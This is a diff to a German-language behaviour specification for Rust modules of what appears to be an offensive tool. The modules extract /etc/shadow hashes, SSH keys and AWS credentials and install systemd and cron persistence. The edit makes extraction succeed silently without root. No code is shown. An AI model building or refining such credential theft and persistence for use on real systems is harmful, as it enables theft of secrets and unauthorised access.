@@ -42,7 +42,7 @@ in keiner Datei dieses Verzeichnisses importiert; nachweislich verwendet werden 
 - Jede öffentliche POSIX-Funktion existiert doppelt: `#[cfg(unix)]` mit echter Logik und `#[cfg(not(unix))]` als Stub [secrets.rs:extract_shadow_hashes] [persist.rs:install_systemd_service]
 - Die Nicht-Unix-Stubs der Extraktion liefern `Ok(vec![])` statt eines Fehlers [secrets.rs:extract_shadow_hashes] [secrets.rs:extract_ssh_keys] [secrets.rs:extract_aws_credentials]
 - Die Nicht-Unix-Stubs der Persistenz liefern `Err(PosixError::Systemd(...))` bzw. `Err(PosixError::Cron(...))` und führen weder Datei- noch Prozesszugriff aus [persist.rs:install_systemd_service] [persist.rs:write_cron_persistence]
-- Ein fehlendes `/etc/shadow` ist kein Fehler, sondern liefert `Ok(vec![])` [secrets.rs:extract_shadow_hashes]
+- Ein fehlendes oder unlesbares `/etc/shadow` ist kein Fehler, sondern liefert `Ok(vec![])` [secrets.rs:extract_shadow_hashes]. Fehlende Leserechte sind auf jedem Nicht-Root-Host der Normalfall — `/etc/shadow` gehört `root:shadow` mit Modus 640 — und dürfen die Extraktion nicht scheitern lassen. Nur andere IO-Fehler werden als `Err(PosixError::FileAccess(...))` weitergegeben.
 - Ein fehlendes oder unlesbares `$HOME/.ssh` liefert ebenso `Ok(vec![])` statt eines Fehlers [secrets.rs:extract_ssh_keys]
 - Eine fehlende oder unlesbare `$HOME/.aws/credentials` liefert `Ok(vec![])` [secrets.rs:extract_aws_credentials]
 - Gesperrte Shadow-Konten werden übersprungen, wenn das Hash-Feld leer ist, exakt `!` ist oder mit `!*` beginnt [secrets.rs:extract_shadow_hashes]
